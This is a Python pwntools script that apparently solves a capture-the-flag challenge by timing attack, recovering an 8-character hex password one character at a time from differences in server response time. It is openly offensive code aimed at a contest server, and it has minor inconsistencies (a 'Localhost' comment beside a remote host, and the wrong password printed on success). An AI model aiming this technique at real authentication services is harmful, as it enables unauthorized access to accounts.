from pwn import *
import time
import string

# Server configuration (replace with actual remote details if needed)
host = 'challenge.ctf.games'  # Localhost for testing
port = 30453  # Local server port

# Hexadecimal character set for password guessing
hex_chars = "0123456789abcdef"

def send_guess_and_measure(io, guess, attempts=1):
    """Send a guess to the server and measure the average response time."""
    total_time = 0

    try:
        for _ in range(attempts):
            io.sendline(guess.encode('utf-8'))  # Send the guess

            start = time.time()  # Start timer
            response = io.recvline(timeout=5).decode().strip()  # Receive response
            elapsed = time.time() - start  # Measure elapsed time
            total_time += elapsed

            # Print the server response exactly as received
            print(response)

            if "flag" in response.lower():  # If flag is found, exit immediately
                print("Flag received!")
                return guess, True  # Return the correct password

        return total_time / attempts, False  # Return average time and success status

    except EOFError:
        print("Connection closed unexpectedly.")
        return float('inf'), False  # Use a high value to indicate failure

def read_until_prompt(io):
    """Read from the server until the ': ' prompt."""
    data = b""
    while not data.endswith(b": "):
        chunk = io.recv(1)  # Read 1 byte at a time
        if not chunk:
            print("Connection closed due to empty chunk.")
            return False  # Handle server disconnection
        data += chunk
    # Print the prompt and ensure no newline is added
    print(data.decode(), end='', flush=True)
    return True

def sequential_timing_attack():
    """Perform the optimized sequential timing attack."""
    password = ['f'] * 8  # Start with all 'f's
    io = remote(host, port)  # Connect to the server

    try:
        # Iterate over each position in the password
        for pos in range(8):
            max_time = 0
            best_char = 'f'  # Default to 'f'

            # Test each possible character for the current position
            for char in hex_chars:
                guess = password[:]  # Copy the current password state
                guess[pos] = char  # Replace the character at the current position
                guess_str = ''.join(guess)

                if not read_until_prompt(io):
                    io.close()
                    exit(1)  # Exit if the server disconnects

                # Print the guess as if the user typed it in response to the prompt
                print(guess_str, flush=True)

                # Measure the response time for this guess
                elapsed_time, found = send_guess_and_measure(io, guess_str)

                if found:  # If the flag is found, exit immediately
                    print(f"Flag found: {''.join(password)}")
                    return

                # Track the character with the longest average response time
                if elapsed_time > max_time:
                    max_time = elapsed_time
                    best_char = char

            # Update the password with the best character for this position
            password[pos] = best_char

        # Submit the final password
        final_password = ''.join(password)
        if read_until_prompt(io):
            print(final_password, flush=True)  # Print the final guess
            io.sendline(final_password.encode('utf-8'))  # Send the complete password

            # Read all remaining responses from the server
            flag_received = False
            try:
                while True:
                    # Receive a line from the server with a timeout
                    response = io.recvline(timeout=10).decode().strip()
                    print(response)  # Print the server response

                    if "flag" in response.lower():  # Check if the flag is included
                        print("Flag received!")
                        flag_received = True
                        break

            except EOFError:
                print("Connection closed unexpectedly.")

            if not flag_received:
                print("Flag not found in the server response.")

    finally:
        io.close()  # Ensure the connection is closed
if __name__ == "__main__":
    sequential_timing_attack()

